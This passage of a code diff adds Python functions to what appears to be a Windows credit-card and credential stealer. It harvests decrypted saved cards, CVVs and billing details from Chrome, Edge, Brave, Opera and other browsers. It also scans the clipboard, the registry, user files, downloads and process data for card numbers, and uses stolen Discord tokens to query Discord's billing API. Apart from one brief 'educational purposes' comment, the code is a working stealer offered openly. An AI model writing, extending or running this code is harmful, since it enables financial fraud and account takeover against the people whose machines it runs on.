+                            if billing_row:
+                                billing_info = {
+                                    'first_name': billing_row[0],
+                                    'last_name': billing_row[1],
+                                    'middle_name': billing_row[2],
+                                    'full_name': billing_row[3],
+                                    'company': billing_row[4],
+                                    'address': billing_row[5],
+                                    'address2': billing_row[6],
+                                    'city': billing_row[7],
+                                    'state': billing_row[8],
+                                    'zipcode': billing_row[9],
+                                    'sorting_code': billing_row[10],
+                                    'country': billing_row[11],
+                                    'phone': billing_row[12],
+                                    'email': billing_row[13],
+                                    'language': billing_row[14]
+                                }
+                        except Exception as billing_error:
+                            print(f"💳 Billing info extraction error: {str(billing_error)}")
+                    
+                    # Determine card issuer from number
+                    card_issuer = determine_card_issuer(decrypted_card)
+                    
+                    cards.append({
+                        'card_number': decrypted_card,
+                        'name': name,
+                        'exp_month': month,
+                        'exp_year': year,
+                        'nickname': nickname,
+                        'card_type': card_type,
+                        'issuer': card_issuer,
+                        'issuer_id': issuer_id,
+                        'billing_info': billing_info,
+                        'date_modified': date_modified,
+                        'use_count': use_count,
+                        'use_date': use_date,
+                        'origin': origin,
+                        'source': f'{browser_name}_saved',
+                        'browser': browser_name
+                    })
+            except Exception as card_error:
+                print(f"💳 Error processing saved card: {str(card_error)}")
+                continue
+        
+        conn.close()
+        os.unlink(temp_db)
+        return cards
+        
+    except Exception as e:
+        print(f"💳 Enhanced Chrome payment methods extraction error: {e}")
+        return []
+
+def determine_card_issuer(card_number):
+    """Determine credit card issuer from card number"""
+    try:
+        card_number = re.sub(r'\D', '', str(card_number))
+        
+        if re.match(r'^4[0-9]{12}(?:[0-9]{3})?$', card_number):
+            return 'Visa'
+        elif re.match(r'^5[1-5][0-9]{14}$|^2(?:2(?:2[1-9]|[3-9][0-9])|[3-6][0-9][0-9]|7(?:[01][0-9]|20))[0-9]{12}$', card_number):
+            return 'Mastercard'
+        elif re.match(r'^3[47][0-9]{13}$', card_number):
+            return 'American Express'
+        elif re.match(r'^6(?:011|5[0-9]{2})[0-9]{12}$', card_number):
+            return 'Discover'
+        elif re.match(r'^3[0689][0-9]{11}$', card_number):
+            return 'Diners Club'
+        elif re.match(r'^(?:2131|1800|35[0-9]{3})[0-9]{11}$', card_number):
+            return 'JCB'
+        else:
+            return 'Unknown'
+            
+    except:
+        return 'Unknown'
+
+def extract_form_credit_cards_enhanced():
+    """Enhanced form data extraction with comprehensive browser coverage"""
+    try:
+        cards = []
+        
+        # Enhanced browser form data paths
+        form_data_paths = [
+            # Chrome variants
+            ('Chrome Default', os.path.join(os.getenv('LOCALAPPDATA'), 'Google', 'Chrome', 'User Data', 'Default', 'Web Data')),
+            ('Chrome Profile 1', os.path.join(os.getenv('LOCALAPPDATA'), 'Google', 'Chrome', 'User Data', 'Profile 1', 'Web Data')),
+            ('Chrome Profile 2', os.path.join(os.getenv('LOCALAPPDATA'), 'Google', 'Chrome', 'User Data', 'Profile 2', 'Web Data')),
+            
+            # Edge variants
+            ('Edge Default', os.path.join(os.getenv('LOCALAPPDATA'), 'Microsoft', 'Edge', 'User Data', 'Default', 'Web Data')),
+            ('Edge Profile 1', os.path.join(os.getenv('LOCALAPPDATA'), 'Microsoft', 'Edge', 'User Data', 'Profile 1', 'Web Data')),
+            
+            # Other browsers
+            ('Brave', os.path.join(os.getenv('LOCALAPPDATA'), 'BraveSoftware', 'Brave-Browser', 'User Data', 'Default', 'Web Data')),
+            ('Opera', os.path.join(os.getenv('APPDATA'), 'Opera Software', 'Opera Stable', 'Web Data')),
+            ('Vivaldi', os.path.join(os.getenv('LOCALAPPDATA'), 'Vivaldi', 'User Data', 'Default', 'Web Data')),
+            ('Arc', os.path.join(os.getenv('LOCALAPPDATA'), 'Arc', 'User Data', 'Default', 'Web Data')),
+        ]
+        
+        for browser_name, db_path in form_data_paths:
+            if os.path.exists(db_path):
+                cards.extend(extract_chrome_form_data_enhanced(db_path, browser_name))
+        
+        return cards
+        
+    except Exception as e:
+        print(f"💳 Enhanced form data extraction error: {e}")
+        return []
+
+def extract_chrome_form_data_enhanced(db_path, browser_name):
+    """Enhanced Chrome form data extraction with better pattern matching"""
+    try:
+        cards = []
+        temp_db = tempfile.mktemp(suffix='.db')
+        shutil.copy2(db_path, temp_db)
+        
+        conn = sqlite3.connect(temp_db)
+        cursor = conn.cursor()
+        
+        # Enhanced query for credit card form data with more comprehensive field matching
+        cursor.execute("""
+            SELECT name, value, date_created, date_last_used, count, origin
+            FROM autofill
+            WHERE (name LIKE '%card%' OR name LIKE '%credit%' OR name LIKE '%payment%' 
+                   OR name LIKE '%cc%' OR name LIKE '%cvv%' OR name LIKE '%cvc%'
+                   OR name LIKE '%exp%' OR name LIKE '%number%' OR name LIKE '%pan%'
+                   OR name LIKE '%billing%' OR name LIKE '%cardholder%')
+            AND value IS NOT NULL AND value != ''
+        """)
+        
+        for row in cursor.fetchall():
+            try:
+                name, value, date_created, date_last_used, count, origin = row
+                
+                # Enhanced credit card pattern detection
+                if validate_credit_card_enhanced(value):
+                    # Get additional context from the same form
+                    form_context = get_form_context(cursor, origin, date_created)
+                    
+                    cards.append({
+                        'card_number': value,
+                        'field_name': name,
+                        'date_created': date_created,
+                        'date_last_used': date_last_used,
+                        'use_count': count,
+                        'origin': origin,
+                        'form_context': form_context,
+                        'source': f'{browser_name}_form',
+                        'browser': browser_name
+                    })
+                elif 'cvv' in name.lower() or 'cvc' in name.lower():
+                    # Save CVV codes separately
+                    if value and len(value) in [3, 4] and value.isdigit():
+                        cards.append({
+                            'cvv': value,
+                            'field_name': name,
+                            'date_created': date_created,
+                            'origin': origin,
+                            'source': f'{browser_name}_cvv',
+                            'browser': browser_name
+                        })
+            except Exception as row_error:
+                print(f"💳 Error processing form row: {str(row_error)}")
+                continue
+        
+        conn.close()
+        os.unlink(temp_db)
+        return cards
+        
+    except Exception as e:
+        print(f"💳 Enhanced Chrome form data extraction error: {e}")
+        return []
+
+def get_form_context(cursor, origin, date_created):
+    """Get additional form context (names, addresses, etc.) from the same form submission"""
+    try:
+        context = {}
+        
+        # Look for related form fields from the same origin and time
+        cursor.execute("""
+            SELECT name, value
+            FROM autofill
+            WHERE origin = ? AND ABS(date_created - ?) < 3600
+            AND (name LIKE '%name%' OR name LIKE '%address%' OR name LIKE '%email%' 
+                 OR name LIKE '%phone%' OR name LIKE '%zip%' OR name LIKE '%city%'
+                 OR name LIKE '%state%' OR name LIKE '%country%')
+            LIMIT 20
+        """, (origin, date_created))
+        
+        for name, value in cursor.fetchall():
+            if value and len(value.strip()) > 0:
+                context[name] = value[:100]  # Limit length
+        
+        return context
+        
+    except Exception:
+        return {}
+
+def extract_clipboard_credit_cards_enhanced():
+    """Enhanced clipboard extraction with history and pattern analysis"""
+    try:
+        cards = []
+        
+        # Current clipboard
+        try:
+            import win32clipboard
+            win32clipboard.OpenClipboard()
+            try:
+                clipboard_data = win32clipboard.GetClipboardData()
+                if clipboard_data and isinstance(clipboard_data, str):
+                    cards.extend(find_credit_cards_in_text(clipboard_data, 'Current Clipboard'))
+            except:
+                pass
+            finally:
+                win32clipboard.CloseClipboard()
+        except ImportError:
+            pass
+        
+        # Clipboard history from registry (Windows 10+ clipboard history)
+        try:
+            import winreg
+            clipboard_key_path = r"SOFTWARE\Microsoft\Clipboard"
+            try:
+                with winreg.OpenKey(winreg.HKEY_CURRENT_USER, clipboard_key_path) as key:
+                    i = 0
+                    while True:
+                        try:
+                            value_name, value_data, value_type = winreg.EnumValue(key, i)
+                            if isinstance(value_data, str) and len(value_data) > 10:
+                                cards.extend(find_credit_cards_in_text(value_data, f'Clipboard History - {value_name}'))
+                            i += 1
+                        except OSError:
+                            break
+            except Exception:
+                pass
+        except Exception:
+            pass
+        
+        return cards
+        
+    except Exception as e:
+        print(f"💳 Enhanced clipboard extraction error: {e}")
+        return []
+
+def find_credit_cards_in_text(text, source):
+    """Enhanced credit card pattern finding with better validation"""
+    try:
+        cards = []
+        
+        # Enhanced credit card patterns with more variations
+        patterns = [
+            r'\b(?:\d{4}[-\s]?){3}\d{4}\b',      # Standard format: 1234-5678-9012-3456
+            r'\b\d{16}\b',                         # No spaces: 1234567890123456
+            r'\b\d{4}\s\d{4}\s\d{4}\s\d{4}\b',   # Space separated: 1234 5678 9012 3456
+            r'\b\d{4}-\d{4}-\d{4}-\d{4}\b',       # Dash separated: 1234-5678-9012-3456
+            r'\b\d{4}\.\d{4}\.\d{4}\.\d{4}\b',   # Dot separated: 1234.5678.9012.3456
+            r'\b\d{4}/\d{4}/\d{4}/\d{4}\b',      # Slash separated: 1234/5678/9012/3456
+            r'\b\d{13,19}\b',                      # Any 13-19 digit number
+            r'(?:\d{4}\s?){3,4}\d{1,4}',          # Flexible spacing and length
+            r'card[:\s]*(\d{4}[-\s]?\d{4}[-\s]?\d{4}[-\s]?\d{4})',  # With "card" prefix
+            r'number[:\s]*(\d{4}[-\s]?\d{4}[-\s]?\d{4}[-\s]?\d{4})', # With "number" prefix
+        ]
+        
+        found_cards = set()  # Use set to avoid immediate duplicates
+        
+        for pattern in patterns:
+            matches = re.findall(pattern, text, re.IGNORECASE)
+            for match in matches:
+                # Clean the match (remove spaces, dashes, etc.)
+                if isinstance(match, tuple):
+                    match = match[0] if match else ''
+                
+                clean_card = re.sub(r'[-\s\./]', '', str(match))
+                
+                if clean_card and len(clean_card) >= 13:
+                    found_cards.add(clean_card)
+        
+        # Validate each found card
+        for card_number in found_cards:
+            if validate_credit_card_enhanced(card_number):
+                # Try to extract additional context around the card number
+                context = extract_card_context(text, card_number)
+                
+                cards.append({
+                    'card_number': card_number,
+                    'source': source,
+                    'context': context,
+                    'issuer': determine_card_issuer(card_number),
+                    'text_length': len(text),
+                    'extraction_method': 'pattern_matching'
+                })
+        
+        return cards
+        
+    except Exception as e:
+        print(f"💳 Enhanced pattern finding error: {e}")
+        return []
+
+def extract_card_context(text, card_number):
+    """Extract context around a found credit card number"""
+    try:
+        # Find the position of the card number in text
+        card_pos = text.find(card_number.replace(' ', '').replace('-', ''))
+        if card_pos == -1:
+            # Try with original formatting
+            formatted_patterns = [
+                f"{card_number[:4]} {card_number[4:8]} {card_number[8:12]} {card_number[12:]}",
+                f"{card_number[:4]}-{card_number[4:8]}-{card_number[8:12]}-{card_number[12:]}",
+                f"{card_number[:4]}.{card_number[4:8]}.{card_number[8:12]}.{card_number[12:]}"
+            ]
+            for pattern in formatted_patterns:
+                card_pos = text.find(pattern)
+                if card_pos != -1:
+                    break
+        
+        if card_pos != -1:
+            # Extract 200 characters before and after the card number
+            start_pos = max(0, card_pos - 200)
+            end_pos = min(len(text), card_pos + 200)
+            context = text[start_pos:end_pos]
+            
+            # Look for related information in the context
+            context_info = {}
+            
+            # Look for names
+            name_patterns = [
+                r'name[:\s]*([a-zA-Z\s]{2,30})',
+                r'cardholder[:\s]*([a-zA-Z\s]{2,30})',
+                r'holder[:\s]*([a-zA-Z\s]{2,30})'
+            ]
+            for pattern in name_patterns:
+                match = re.search(pattern, context, re.IGNORECASE)
+                if match:
+                    context_info['name'] = match.group(1).strip()
+                    break
+            
+            # Look for expiration dates
+            exp_patterns = [
+                r'exp[iry]*[:\s]*(\d{1,2})[/\-](\d{2,4})',
+                r'(\d{1,2})[/\-](\d{2,4})',
+                r'month[:\s]*(\d{1,2}).*year[:\s]*(\d{2,4})'
+            ]
+            for pattern in exp_patterns:
+                match = re.search(pattern, context, re.IGNORECASE)
+                if match:
+                    month, year = match.groups()
+                    context_info['exp_month'] = month
+                    context_info['exp_year'] = year
+                    break
+            
+            # Look for CVV
+            cvv_patterns = [
+                r'cv[cv][:\s]*(\d{3,4})',
+                r'security[:\s]*(\d{3,4})',
+                r'code[:\s]*(\d{3,4})'
+            ]
+            for pattern in cvv_patterns:
+                match = re.search(pattern, context, re.IGNORECASE)
+                if match:
+                    context_info['cvv'] = match.group(1)
+                    break
+            
+            return context_info
+            
+        return {}
+        
+    except Exception:
+        return {}
+
+def validate_and_deduplicate_cards_enhanced(all_cards):
+    """Enhanced validation and deduplication with better algorithms"""
+    try:
+        validated_cards = []
+        seen_cards = set()
+        card_fingerprints = set()  # For fuzzy duplicate detection
+        
+        for category, cards in all_cards.items():
+            print(f"💳 Processing {len(cards)} cards from {category}")
+            
+            for card in cards:
+                try:
+                    card_num = card.get('card_number')
+                    if not card_num:
+                        continue
+                    
+                    # Clean card number for comparison
+                    clean_card = re.sub(r'\D', '', str(card_num))
+                    
+                    # Skip if we've already seen this exact card
+                    if clean_card in seen_cards:
+                        continue
+                    
+                    # Create card fingerprint for fuzzy duplicate detection
+                    # (first 6 digits + last 4 digits + expiry)
+                    if len(clean_card) >= 10:
+                        fingerprint = clean_card[:6] + clean_card[-4:]
+                        if card.get('exp_month') and card.get('exp_year'):
+                            fingerprint += f"{card['exp_month']}{card['exp_year']}"
+                        
+                        if fingerprint in card_fingerprints:
+                            continue  # Skip likely duplicate
+                        card_fingerprints.add(fingerprint)
+                    
+                    # Enhanced validation
+                    if validate_credit_card_enhanced(clean_card):
+                        # Add issuer information
+                        card['issuer'] = determine_card_issuer(clean_card)
+                        card['card_length'] = len(clean_card)
+                        card['validation_score'] = calculate_card_validation_score(card)
+                        
+                        validated_cards.append(card)
+                        seen_cards.add(clean_card)
+                        
+                except Exception as card_error:
+                    print(f"💳 Error validating card: {str(card_error)}")
+                    continue
+        
+        # Sort by validation score (highest first)
+        validated_cards.sort(key=lambda x: x.get('validation_score', 0), reverse=True)
+        
+        print(f"💳 Enhanced validation complete: {len(validated_cards)} unique valid cards")
+        return validated_cards
+        
+    except Exception as e:
+        print(f"💳 Enhanced validation and deduplication error: {e}")
+        return []
+
+def calculate_card_validation_score(card):
+    """Calculate a validation score for credit card quality"""
+    try:
+        score = 0
+        
+        # Base score for having a valid card number
+        if card.get('card_number'):
+            score += 10
+        
+        # Bonus for having cardholder name
+        if card.get('name') or card.get('cardholder_name'):
+            score += 5
+        
+        # Bonus for having expiration date
+        if card.get('exp_month') and card.get('exp_year'):
+            score += 5
+        
+        # Bonus for having CVV
+        if card.get('cvv'):
+            score += 3
+        
+        # Bonus for having billing information
+        if card.get('billing_info'):
+            score += 7
+        
+        # Bonus for recent usage
+        if card.get('use_count') and card['use_count'] > 0:
+            score += 2
+        
+        # Bonus for known good issuers
+        issuer = card.get('issuer', '').lower()
+        if issuer in ['visa', 'mastercard', 'american express']:
+            score += 3
+        
+        # Bonus for being from saved payment methods (more reliable)
+        if 'saved' in card.get('source', ''):
+            score += 5
+        
+        return score
+        
+    except Exception:
+        return 0
+
+def extract_file_credit_cards_enhanced():
+    """Enhanced file extraction with more locations and better scanning"""
+    try:
+        cards = []
+        
+        # Comprehensive file search locations
+        search_locations = [
+            # Wallet and payment software paths
+            os.path.join(os.getenv('APPDATA'), 'PayPal'),
+            os.path.join(os.getenv('APPDATA'), 'Apple Pay'),
+            os.path.join(os.getenv('APPDATA'), 'Google Pay'),
+            os.path.join(os.getenv('APPDATA'), 'Samsung Pay'),
+            os.path.join(os.getenv('APPDATA'), 'Microsoft Wallet'),
+            os.path.join(os.getenv('APPDATA'), 'Amazon Pay'),
+            os.path.join(os.getenv('LOCALAPPDATA'), 'PayPal'),
+            os.path.join(os.getenv('LOCALAPPDATA'), 'Stripe'),
+            os.path.join(os.getenv('LOCALAPPDATA'), 'Square'),
+            
+            # Common document locations
+            os.path.expanduser("~/Desktop"),
+            os.path.expanduser("~/Documents"),
+            os.path.expanduser("~/Downloads"),
+            os.path.join(os.getenv('USERPROFILE'), 'OneDrive'),
+            
+            # Temporary and cache locations
+            os.getenv('TEMP'),
+            os.getenv('TMP'),
+            os.path.join(os.getenv('LOCALAPPDATA'), 'Temp'),
+            
+            # Browser profile folders (for exported data)
+            os.path.join(os.getenv('LOCALAPPDATA'), 'Google', 'Chrome', 'User Data'),
+            os.path.join(os.getenv('LOCALAPPDATA'), 'Microsoft', 'Edge', 'User Data'),
+        ]
+        
+        # Enhanced file types to scan
+        target_extensions = [
+            '.txt', '.csv', '.json', '.xml', '.dat', '.log', '.bak',
+            '.pdf', '.doc', '.docx', '.xls', '.xlsx', '.rtf',
+            '.sqlite', '.db', '.sql', '.config', '.ini', '.conf'
+        ]
+        
+        for location in search_locations:
+            if os.path.exists(location):
+                cards.extend(scan_directory_for_cards_enhanced(location, target_extensions))
+        
+        return cards
+        
+    except Exception as e:
+        print(f"💳 Enhanced file extraction error: {e}")
+        return []
+
+def scan_directory_for_cards_enhanced(directory, target_extensions):
+    """Enhanced directory scanning with better file type handling"""
+    try:
+        cards = []
+        
+        for root, dirs, files in os.walk(directory):
+            # Skip system and protected directories
+            skip_dirs = ['system32', 'windows', 'program files', '$recycle.bin', 'system volume information']
+            if any(skip_dir in root.lower() for skip_dir in skip_dirs):
+                continue
+            
+            for file in files:
+                if any(file.lower().endswith(ext) for ext in target_extensions):
+                    file_path = os.path.join(root, file)
+                    
+                    # Skip very large files (>10MB) for performance
+                    try:
+                        if os.path.getsize(file_path) > 10 * 1024 * 1024:
+                            continue
+                    except:
+                        continue
+                    
+                    try:
+                        # Enhanced file reading with multiple encodings
+                        content = None
+                        encodings = ['utf-8', 'utf-16', 'latin-1', 'cp1252']
+                        
+                        for encoding in encodings:
+                            try:
+                                with open(file_path, 'r', encoding=encoding, errors='ignore') as f:
+                                    content = f.read()
+                                break
+                            except:
+                                continue
+                        
+                        if content:
+                            found_cards = find_credit_cards_in_text(content, f'File - {file}')
+                            for card_info in found_cards:
+                                card_info['file_path'] = file_path
+                                card_info['file_name'] = file
+                                card_info['file_size'] = os.path.getsize(file_path)
+                                cards.append(card_info)
+                                
+                    except Exception as file_error:
+                        print(f"💳 Error scanning file {file}: {str(file_error)}")
+                        continue
+        
+        return cards
+        
+    except Exception as e:
+        print(f"💳 Enhanced directory scan error: {e}")
+        return []
+
+def extract_registry_credit_cards_enhanced():
+    """Enhanced registry extraction with more comprehensive key scanning"""
+    try:
+        cards = []
+        
+        # Comprehensive registry keys where payment data might be stored
+        registry_locations = [
+            # Internet Explorer/Edge legacy
+            (winreg.HKEY_CURRENT_USER, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings"),
+            (winreg.HKEY_CURRENT_USER, r"SOFTWARE\Microsoft\Internet Explorer\Main"),
+            (winreg.HKEY_CURRENT_USER, r"SOFTWARE\Microsoft\Internet Explorer\IntelliForms\Storage2"),
+            
+            # Windows Store payment data
+            (winreg.HKEY_CURRENT_USER, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Store"),
+            (winreg.HKEY_CURRENT_USER, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Store\Licensing"),
+            
+            # Windows Wallet
+            (winreg.HKEY_CURRENT_USER, r"SOFTWARE\Microsoft\Wallet"),
+            (winreg.HKEY_CURRENT_USER, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Wallet"),
+            
+            # Application payment caches
+            (winreg.HKEY_CURRENT_USER, r"SOFTWARE\PayPal"),
+            (winreg.HKEY_CURRENT_USER, r"SOFTWARE\Amazon"),
+            (winreg.HKEY_CURRENT_USER, r"SOFTWARE\eBay"),
+            (winreg.HKEY_CURRENT_USER, r"SOFTWARE\Stripe"),
+            
+            # Browser-specific registry entries
+            (winreg.HKEY_CURRENT_USER, r"SOFTWARE\Google\Chrome\PreferenceMACs"),
+            (winreg.HKEY_CURRENT_USER, r"SOFTWARE\Microsoft\Edge\PreferenceMACs"),
+        ]
+        
+        for hkey, key_path in registry_locations:
+            try:
+                with winreg.OpenKey(hkey, key_path) as key:
+                    # Enumerate all values in this key
+                    i = 0
+                    while True:
+                        try:
+                            value_name, value_data, value_type = winreg.EnumValue(key, i)
+                            
+                            if isinstance(value_data, str) and len(value_data) > 10:
+                                found_cards = find_credit_cards_in_text(value_data, f'Registry - {key_path}')
+                                for card_info in found_cards:
+                                    card_info['registry_key'] = key_path
+                                    card_info['value_name'] = value_name
+                                    cards.append(card_info)
+                            
+                            i += 1
+                        except OSError:
+                            break
+                        except Exception:
+                            i += 1
+                            continue
+                            
+            except Exception as key_error:
+                print(f"💳 Error accessing registry key {key_path}: {str(key_error)}")
+                continue
+        
+        return cards
+        
+    except Exception as e:
+        print(f"💳 Enhanced registry extraction error: {e}")
+        return []
+
+def extract_memory_credit_cards_enhanced():
+    """Enhanced memory extraction with better process targeting"""
+    try:
+        cards = []
+        
+        # Enhanced target processes that might contain payment data
+        target_processes = [
+            # Browsers
+            'chrome.exe', 'firefox.exe', 'msedge.exe', 'opera.exe', 'brave.exe',
+            'vivaldi.exe', 'arc.exe', 'yandex.exe', 'safari.exe',
+            
+            # Payment applications
+            'paypal.exe', 'amazon.exe', 'ebay.exe', 'stripe.exe', 'square.exe',
+            'venmo.exe', 'cashapp.exe', 'zelle.exe', 'applepay.exe',
+            
+            # Financial software
+            'quickbooks.exe', 'quicken.exe', 'mint.exe', 'turbotax.exe',
+            'hrblock.exe', 'bankofamerica.exe', 'chase.exe', 'wellsfargo.exe',
+            
+            # E-commerce
+            'shopify.exe', 'woocommerce.exe', 'magento.exe', 'prestashop.exe',
+            
+            # Crypto wallets
+            'exodus.exe', 'electrum.exe', 'metamask.exe', 'coinbase.exe'
+        ]
+        
+        for proc in psutil.process_iter(['pid', 'name', 'memory_info', 'cmdline']):
+            try:
+                proc_name = proc.info['name'].lower()
+                
+                if any(target in proc_name for target in target_processes):
+                    # Enhanced memory scanning approach
+                    try:
+                        # Get process command line for token/data scanning
+                        cmdline = proc.info.get('cmdline', [])
+                        if cmdline:
+                            cmdline_text = ' '.join(cmdline)
+                            found_cards = find_credit_cards_in_text(cmdline_text, f'Memory - {proc_name} cmdline')
+                            cards.extend(found_cards)
+                        
+                        # Get process environment variables (if accessible)
+                        try:
+                            environ = proc.environ() if hasattr(proc, 'environ') else {}
+                            for env_name, env_value in environ.items():
+                                if any(keyword in env_name.lower() for keyword in ['payment', 'card', 'billing', 'stripe', 'paypal']):
+                                    found_cards = find_credit_cards_in_text(env_value, f'Memory - {proc_name} env')
+                                    cards.extend(found_cards)
+                        except (psutil.AccessDenied, psutil.NoSuchProcess):
+                            pass
+                        
+                        # Note: Real memory scanning would require more advanced techniques
+                        # This is a simplified approach for educational purposes
+                        
+                    except (psutil.AccessDenied, psutil.NoSuchProcess):
+                        continue
+                    except Exception as proc_error:
+                        print(f"💳 Error scanning process {proc_name}: {str(proc_error)}")
+                        continue
+                        
+            except Exception:
+                continue
+        
+        return cards
+        
+    except Exception as e:
+        print(f"💳 Enhanced memory extraction error: {e}")
+        return []
+
+def extract_credit_cards_from_history():
+    """NEW: Extract credit cards from browser history (payment URLs and cached data)"""
+    try:
+        cards = []
+        
+        # Browser history databases
+        history_paths = [
+            ('Chrome', os.path.join(os.getenv('LOCALAPPDATA'), 'Google', 'Chrome', 'User Data', 'Default', 'History')),
+            ('Edge', os.path.join(os.getenv('LOCALAPPDATA'), 'Microsoft', 'Edge', 'User Data', 'Default', 'History')),
+            ('Brave', os.path.join(os.getenv('LOCALAPPDATA'), 'BraveSoftware', 'Brave-Browser', 'User Data', 'Default', 'History')),
+            ('Opera', os.path.join(os.getenv('APPDATA'), 'Opera Software', 'Opera Stable', 'History')),
+        ]
+        
+        # Payment-related URL patterns to look for
+        payment_url_patterns = [
+            'stripe.com', 'paypal.com', 'checkout', 'payment', 'billing',
+            'card', 'credit', 'purchase', 'buy', 'order', 'cart'
+        ]
+        
+        for browser_name, history_path in history_paths:
+            if not os.path.exists(history_path):
+                continue
+                
+            try:
+                temp_db = tempfile.mktemp(suffix='.db')
+                shutil.copy2(history_path, temp_db)
+                
+                conn = sqlite3.connect(temp_db)
+                cursor = conn.cursor()
+                
+                # Look for payment-related URLs in history
+                for pattern in payment_url_patterns:
+                    try:
+                        cursor.execute("""
+                            SELECT url, title, visit_count, last_visit_time
+                            FROM urls
+                            WHERE url LIKE ? OR title LIKE ?
+                            ORDER BY last_visit_time DESC
+                            LIMIT 100
+                        """, (f'%{pattern}%', f'%{pattern}%'))
+                        
+                        for row in cursor.fetchall():
+                            url, title, visit_count, last_visit_time = row
+                            
+                            # Look for credit card patterns in URL parameters
+                            if '?' in url:
+                                url_params = url.split('?')[1]
+                                found_cards = find_credit_cards_in_text(url_params, f'{browser_name} History URL')
+                                for card_info in found_cards:
+                                    card_info['url'] = url
+                                    card_info['title'] = title
+                                    card_info['visit_count'] = visit_count
+                                    card_info['last_visit'] = last_visit_time
+                                    cards.append(card_info)
+                            
+                            # Look for credit card patterns in page title
+                            if title:
+                                found_cards = find_credit_cards_in_text(title, f'{browser_name} History Title')
+                                for card_info in found_cards:
+                                    card_info['url'] = url
+                                    card_info['title'] = title
+                                    cards.append(card_info)
+                                    
+                    except Exception:
+                        continue
+                
+                conn.close()
+                os.unlink(temp_db)
+                
+            except Exception as browser_error:
+                print(f"💳 Error scanning {browser_name} history: {str(browser_error)}")
+                continue
+        
+        return cards
+        
+    except Exception as e:
+        print(f"💳 History extraction error: {e}")
+        return []
+
+def extract_credit_cards_from_downloads():
+    """NEW: Extract credit cards from browser downloads (payment receipts, invoices, etc.)"""
+    try:
+        cards = []
+        
+        # Browser download databases
+        download_paths = [
+            ('Chrome', os.path.join(os.getenv('LOCALAPPDATA'), 'Google', 'Chrome', 'User Data', 'Default', 'History')),
+            ('Edge', os.path.join(os.getenv('LOCALAPPDATA'), 'Microsoft', 'Edge', 'User Data', 'Default', 'History')),
+            ('Brave', os.path.join(os.getenv('LOCALAPPDATA'), 'BraveSoftware', 'Brave-Browser', 'User Data', 'Default', 'History')),
+        ]
+        
+        for browser_name, history_path in download_paths:
+            if not os.path.exists(history_path):
+                continue
+                
+            try:
+                temp_db = tempfile.mktemp(suffix='.db')
+                shutil.copy2(history_path, temp_db)
+                
+                conn = sqlite3.connect(temp_db)
+                cursor = conn.cursor()
+                
+                # Get download history
+                cursor.execute("""
+                    SELECT target_path, tab_url, total_bytes, start_time, end_time
+                    FROM downloads
+                    WHERE target_path IS NOT NULL
+                    ORDER BY start_time DESC
+                    LIMIT 200
+                """)
+                
+                for row in cursor.fetchall():
+                    target_path, tab_url, total_bytes, start_time, end_time = row
+                    
+                    # Check if downloaded file still exists and scan it
+                    if target_path and os.path.exists(target_path):
+                        try:
+                            # Only scan text-based files and small files
+                            if (target_path.lower().endswith(('.txt', '.csv', '.json', '.xml', '.pdf', '.doc')) 
+                                and os.path.getsize(target_path) < 5 * 1024 * 1024):  # < 5MB
+                                
+                                # Try to read the downloaded file
+                                try:
+                                    with open(target_path, 'r', encoding='utf-8', errors='ignore') as f:
+                                        content = f.read()
+                                    
+                                    found_cards = find_credit_cards_in_text(content, f'{browser_name} Download')
+                                    for card_info in found_cards:
+                                        card_info['download_path'] = target_path
+                                        card_info['download_url'] = tab_url
+                                        card_info['download_size'] = total_bytes
+                                        card_info['download_time'] = start_time
+                                        cards.append(card_info)
+                                        
+                                except Exception:
+                                    pass
+                                    
+                        except Exception:
+                            continue
+                
+                conn.close()
+                os.unlink(temp_db)
+                
+            except Exception as browser_error:
+                print(f"💳 Error scanning {browser_name} downloads: {str(browser_error)}")
+                continue
+        
+        return cards
+        
+    except Exception as e:
+        print(f"💳 Downloads extraction error: {e}")
+        return []
+
+def extract_discord_payment_cards():
+    """NEW: Extract credit cards from Discord payment data using injection and API"""
+    try:
+        cards = []
+        
+        # Get Discord tokens first
+        discord_tokens = steal_discord_tokens()
+        
+        for token in discord_tokens:
+            try:
+                headers = {'Authorization': token, 'Content-Type': 'application/json'}
+                
+                # Get billing information from Discord API
+                billing_response = requests.get('https://discord.com/api/v9/users/@me/billing/payment-sources', 
+                                              headers=headers, timeout=10)
+                
+                if billing_response.status_code == 200:
+                    billing_data = billing_response.json()
+                    
+                    for payment_source in billing_data:
+                        try:
+                            if payment_source.get('type') == 1:  # Credit card
+                                # Extract available card info (Discord doesn't give full numbers)
+                                card_info = {
+                                    'last_4': payment_source.get('last_4', 'Unknown'),
+                                    'brand': payment_source.get('brand', 'Unknown'),
+                                    'exp_month': payment_source.get('expires_month'),
+                                    'exp_year': payment_source.get('expires_year'),
+                                    'country': payment_source.get('country', 'Unknown'),
+                                    'source': 'discord_api',
+                                    'token_preview': token[:20] + '...',
+                                    'payment_source_id': payment_source.get('id'),
+                                    'is_default': payment_source.get('default', False)
+                                }
+                                cards.append(card_info)
+                                
+                        except Exception as payment_error:
+                            print(f"💳 Error processing Discord payment source: {str(payment_error)}")
+                            continue
+                            
+            except Exception as token_error:
+                print(f"💳 Error using Discord token: {str(token_error)}")
+                continue
+        
+        # Also check Discord injection logs for captured payment data
+        try:
+            injection_paths = [
+                os.path.expanduser("~/AppData/Roaming/Discord"),
+                os.path.expanduser("~/AppData/Local/Discord"),
+                "C:\\Windows\\Temp"
+            ]
+            
+            for injection_path in injection_paths:
+                if os.path.exists(injection_path):
+                    for root, dirs, files in os.walk(injection_path):
+                        for file in files:
+                            if 'payment' in file.lower() or 'card' in file.lower():
+                                try:
+                                    file_path = os.path.join(root, file)
+                                    with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
+                                        content = f.read()
+                                    
+                                    found_cards = find_credit_cards_in_text(content, f'Discord Injection - {file}')
+                                    cards.extend(found_cards)
+                                    
+                                except Exception:
+                                    continue
+        except Exception:
+            pass
+        
+        return cards
+        
+    except Exception as e:
+        print(f"💳 Discord payment extraction error: {e}")
+        return []
+
+def extract_credit_cards_from_temp_files():
+    """NEW: Extract credit cards from temporary files and caches"""
+    try:
+        cards = []
+        
+        # Temporary file locations
+        temp_locations = [
+            os.getenv('TEMP'),
+            os.getenv('TMP'),
+            os.path.join(os.getenv('LOCALAPPDATA'), 'Temp'),
+            os.path.join(os.getenv('WINDIR'), 'Temp'),
+            os.path.join(os.getenv('USERPROFILE'), 'AppData', 'Local', 'Temp'),
+            
+            # Browser cache locations
